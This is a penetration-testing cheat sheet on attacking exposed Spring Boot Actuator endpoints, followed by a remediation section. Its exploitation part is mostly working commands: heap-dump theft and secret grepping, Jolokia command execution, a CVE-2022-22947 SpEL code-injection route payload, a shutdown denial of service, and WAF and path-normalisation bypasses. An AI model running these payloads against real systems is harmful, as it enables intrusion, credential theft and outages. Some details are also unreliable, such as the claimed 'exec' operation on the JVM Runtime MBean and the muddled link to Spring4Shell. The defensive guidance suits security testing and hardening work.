# Spring Boot Actuator

> Spring Boot's "management" endpoints (`/actuator/*`) expose heap dumps, env vars, beans, mappings — high-impact when reachable unauthenticated. Authorized testing only.

## TL;DR
- Pre-2.0 Spring Boot exposed all actuators by default at `/<actuator-name>`. Post-2.0 only `/actuator/health` and `/actuator/info` are exposed; the rest require explicit `management.endpoints.web.exposure.include`. Operators frequently set `=*` for convenience → full attack surface.
- Highest-impact endpoints: `/heapdump` (memory dump → secrets), `/env` (config + secrets), `/jolokia` (JMX → RCE via `Runtime.exec` MBean), `/gateway` (Spring Cloud Gateway → SSRF/RCE), `/restart` and `/shutdown`.
- Defence: don't expose actuators on the public listener; if needed, separate management port + auth + IP allow-list.

## Detection / Discovery
```bash
# Probe common actuator paths
for p in actuator actuator/health actuator/info actuator/env actuator/mappings \
         actuator/beans actuator/configprops actuator/heapdump actuator/threaddump \
         actuator/loggers actuator/metrics actuator/jolokia actuator/gateway/routes; do
  curl -sk -o /dev/null -w "%{http_code} %{url_effective}\n" https://target/$p
done

# Or with nuclei templates
nuclei -t exposed-panels/springboot-actuators.yaml -u https://target/
```

## Exploitation

### `/heapdump` — full JVM heap (highest value)
```bash
curl -sk https://target/actuator/heapdump -o heap.hprof
# 100s of MB; contains every string in memory: DB passwords, session tokens, JWT keys, ...

# Analyse with Eclipse MAT or VisualVM
# Quick string search:
strings heap.hprof | grep -iE "(password|secret|token|api[_-]?key)" | sort -u | head
```

### `/env` — environment variables + config
```bash
curl -sk https://target/actuator/env | jq
# Spring 2.0+: write to /env to mutate at runtime (if shutdown=true)
# Sometimes lets you set spring.cloud.bootstrap.location to a remote YAML → RCE chain
```

### `/jolokia` → JMX → RCE
Jolokia (HTTP→JMX bridge) endpoint typically at `/actuator/jolokia` or `/jolokia`.
```bash
# List MBeans
curl -sk https://target/actuator/jolokia/list

# Invoke Runtime.exec via the Runtime MBean
curl -sk -X POST https://target/actuator/jolokia \
  -H 'Content-Type: application/json' \
  -d '{"type":"EXEC","mbean":"java.lang:type=Runtime","operation":"exec","arguments":["id"]}'
```
Several public PoCs (`CVE-2022-22965`-class Spring4Shell when combined with the right binder configuration). Verify Jolokia + Spring version against advisories.

### `/gateway/routes` — Spring Cloud Gateway SSRF / RCE
CVE-2022-22947 — Spring Cloud Gateway code-injection via routes API:
```bash
# Create a route with a SpEL-evaluated filter
curl -sk -X POST https://target/actuator/gateway/routes/hax \
  -H 'Content-Type: application/json' \
  -d '{
    "id":"hax",
    "filters":[{"name":"AddResponseHeader","args":{"name":"X","value":"#{T(java.lang.Runtime).getRuntime().exec(\"id\")}"}}],
    "uri":"http://example.com"
  }'

# Refresh routes
curl -sk -X POST https://target/actuator/gateway/refresh

# Trigger
curl -sk https://target/hax
```

### `/shutdown` (rare; should be POST-protected even when exposed)
```bash
curl -sk -X POST https://target/actuator/shutdown
# Brings the app down. DoS only — don't use without explicit ROE approval.
```

### `/loggers` — log injection / log4shell sometimes reached via
Set a logger's level to TRACE and trigger code paths that log untrusted input + JNDI lookup → CVE-2021-44228 chain.

### `/mappings` — full endpoint list
Maps URLs to controllers; speeds up subsequent fuzzing.

## Bypasses
- 401/403 on `/actuator/*` but unauth on `;/..//actuator/...` — Spring Security path-normalisation mismatches (CVE classes resurface every 2 years).
- Behind a reverse proxy stripping `/actuator/` → try `/manage/heapdump`, `/management/heapdump`, custom-named base path (`management.endpoints.web.base-path`).
- WAF blocks `actuator` literal → use HTTP/2 case-tricks, URL-encoded paths.

## Defence / Remediation
- **`management.endpoints.web.exposure.include`** explicit allow-list — only `health` and `info` exposed to the main listener. Never `*` in production.
- **Separate management port**: `management.server.port=9999` + bind only to `127.0.0.1` or an internal management subnet.
- **Spring Security**:
  ```yaml
  management:
    endpoints:
      web:
        exposure:
          include: health,info
    endpoint:
      health:
        show-details: never
  spring:
    security:
      user:
        name: ${ACTUATOR_USER}
        password: ${ACTUATOR_PASS}
  ```
  + a security filter chain that requires auth for `/actuator/**`.
- **Jolokia off in prod** (`management.endpoint.jolokia.enabled=false`) unless explicitly required.
- **Spring Boot version current** — track [Spring Security advisories](https://spring.io/security) for the actuator class of CVEs.
- **Heapdump endpoint**: even with auth, the heap content is sensitive — disable in prod (`management.endpoint.heapdump.enabled=false`).
- **Network**: front-end (nginx / Cloudflare) should not proxy `/actuator/*` to the origin; deny at the edge.

## Sources
- Spring Boot Actuator docs: https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html
- Spring Security advisories: https://spring.io/security
- HackTricks Spring Boot Actuators: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html
- PortSwigger — Spring Boot Actuator: https://portswigger.net/daily-swig/spring-cloud-function-vulnerability (Spring Cloud Gateway / Function research)
- CVE-2022-22947 (Spring Cloud Gateway code injection): https://tanzu.vmware.com/security/cve-2022-22947
- CVE-2022-22965 (Spring4Shell): https://tanzu.vmware.com/security/cve-2022-22965
- nuclei spring-actuator templates: https://github.com/projectdiscovery/nuclei-templates/tree/main/http/exposed-panels (search springboot)
- Veracode write-up — Actuator misconfiguration: https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
